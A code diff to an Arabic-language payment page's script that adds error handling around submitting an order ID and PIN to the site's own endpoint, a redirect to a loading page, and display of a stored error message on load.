@@ -318,16 +318,33 @@
             confirmBtn.disabled = true;
             confirmBtn.textContent = 'جاري المعالجة...';
 
-            await fetch('/submit-pin', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ 
-                    orderId: orderId || localStorage.getItem('orderId'), 
-                    pin: pin 
-                })
-            });
+            try {
+                await fetch('/submit-pin', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ 
+                        orderId: orderId || localStorage.getItem('orderId'), 
+                        pin: pin 
+                    })
+                });
 
-            checkStatus();
+                window.location.href = `payment_loading_ar.html?orderId=${orderId || localStorage.getItem('orderId')}`;
+            } catch (e) {
+                console.error(e);
+                confirmBtn.disabled = false;
+                confirmBtn.textContent = 'متابعة الدفع';
+                showError('حدث خطأ أثناء إرسال البيانات، يرجى المحاولة مرة أخرى');
+            }
+        }
+
+        window.onload = function() {
+            const lastError = localStorage.getItem('lastError');
+            if (lastError) {
+                const errorEl = document.getElementById('errorMessage');
+                errorEl.textContent = lastError;
+                errorEl.classList.add('show');
+                localStorage.removeItem('lastError');
+            }
         }
 
         async function checkStatus() {
